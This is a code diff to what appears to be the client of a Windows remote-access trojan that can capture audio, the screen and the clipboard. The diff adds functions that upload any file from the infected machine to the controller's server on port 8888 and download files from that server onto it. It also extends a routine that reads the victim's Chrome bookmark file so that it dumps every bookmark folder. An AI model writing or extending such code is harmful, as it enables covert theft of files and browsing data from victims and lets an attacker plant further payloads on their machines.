@@ -25,6 +25,7 @@ import psutil
 import pyaudio
 import pyautogui
 import pythoncom
+import requests
 import win32api
 import win32clipboard
 import win32con
@@ -490,6 +491,28 @@ class ClientUtil:
         except Exception as exception:
             return '[-] Error: ' + str(exception)
 
+    @staticmethod
+    def fsupload(client_obj, filename):
+        try:
+            if not os.path.isfile(filename):
+                client_obj.send('[-] File not found')
+                return
+            with open(filename, 'rb') as f:
+                response = requests.post('http://' + client_obj.host + ':8888/upload', files={'file': f})
+                client_obj.send(response.text)
+        except Exception as exception:
+            client_obj.send('[-] Error: ' + str(exception))
+
+    @staticmethod
+    def fsdownload(client_obj, filename):
+        try:
+            response = requests.get('http://' + client_obj.host + ':8888/uploads/' + filename)
+            with open(filename, 'wb') as f:
+                f.write(response.content)
+            client_obj.send('[+] File downloaded successfully')
+        except Exception as exception:
+            client_obj.send('[-] Error: ' + str(exception))
+
 
 def get_time():
     return str(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()))
@@ -721,13 +744,43 @@ def convert_date(ft):
     return utc.strftime('%Y-%m-%d %H:%M:%S')
 
 
+def sort(val):
+    return val['name'].lower()
+
+
+def preorder(tree, depth):
+    depth += 1
+    folders = []
+    result = ''
+    if tree:
+        tree.sort(key=sort)
+        for item in tree:
+            try:
+                children = len(item['children'])
+            except:
+                children = 0
+            if children > 0:
+                folders.append(item)
+            else:
+                result += 'name: ' + item['name'] + '\nurl: ' + item['url'] + '\n'
+    folders.sort(key=sort)
+    for folder in folders:
+        result += '=' * 20 + folder['name'] + '=' * 20 + '\n'
+        subtree = folder['children']
+        result += preorder(subtree, depth)
+    return result
+
+
 def get_bookmark(file):
     with open(file, encoding='utf-8') as f:
         data = json.load(f)
         bookmarks = data['roots']['bookmark_bar']['children']
         result = ''
-        for i in range(len(bookmarks)):
-            result += f'Name: {bookmarks[i]["name"]}\nURL: {bookmarks[i]["url"]}\nAdded on: {convert_date(bookmarks[i]["date_added"])}\n'
+        result += '=' * 20 + 'Bookmark bar' + '=' * 20 + '\n'
+        result += preorder(bookmarks, 0)
+        result += '=' * 20 + 'Other' + '=' * 20 + '\n'
+        bookmarks = data['roots']['other']['children']
+        result += preorder(bookmarks, 0)
         return result
 
 
